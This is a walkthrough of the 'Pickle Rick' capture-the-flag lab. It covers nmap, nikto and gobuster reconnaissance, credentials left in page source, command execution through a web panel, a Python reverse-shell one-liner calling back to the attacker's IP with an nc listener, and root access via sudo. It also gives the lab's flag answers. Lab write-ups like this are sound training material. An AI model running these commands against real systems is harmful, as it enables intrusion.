# Notes for Pickle Rick room. Following along with https://www.youtube.com/watch?v=oCAtfcr3iUw&t=147s


## Tasks

### 1. What is the first ingredient Rick needs?


Running a nmap scan on the ip: 10.10.98.103

```
nmap -sC -sV -oN nmap/initial 10.10.98.103
```

Port 80 is open so there is a wen/application running. 

Doing a nikto scan to see if there is any hidden folders

```
nikto -host http://10.10.98.103 | tee nikto.log
```

By opening the web application in the browser and view page source you will this:

```
  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```

Trying now gobuster with extensions and wordlist:

```
gobuster dir -u http://10.10.98.103 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py
```

By using nikto or gobuster we can see a login page: `/login.php` and `robots.txt`.

On `robots.txt` we get:

```
Wubbalubbadubdub
```

So trying the login with the information gained so far --> Success!

Viewing page source and there is this, maybe to be used??

```
 <!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== -->
```

In the execute prombt I try `ls` and get this:

```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

The command `cat` is disabled. But `grep` is there, so using `grep` to match everything on the `Sup3rS3cretPickl3Ingred.txt`:

```
grep . Sup3rS3cretPickl3Ingred.txt
```

and we get:

```
mr. meeseek hair
```

### 2. Whats the second ingredient Rick needs?

So now we want a reverse shell and poking around we can see that python3 is available:

```
python3 -c "print('hello')"

Output: hello
```

Searching for python3 reverse shell on google, get you here: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python

Trying the first one

```
export RHOST="10.9.1.13";export RPORT=4242;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```
Remember to setup listner:

```
nc -lvnp 4242
```

And we are in!!

Going to `/home/rick/` and doing a `grep . -R` we get the second ingredient:

```
1 jerry tear
```
### 3. Whats the final ingredient Rick needs?

Apparently the user we reversed into have sudo commands, so by using the command `sudo bash` we are now owning the machine. :) 

Going to the root folder `cd` and checking the files we find the `3rd.txt` and the final ingredient is:

```
fleeb juice
```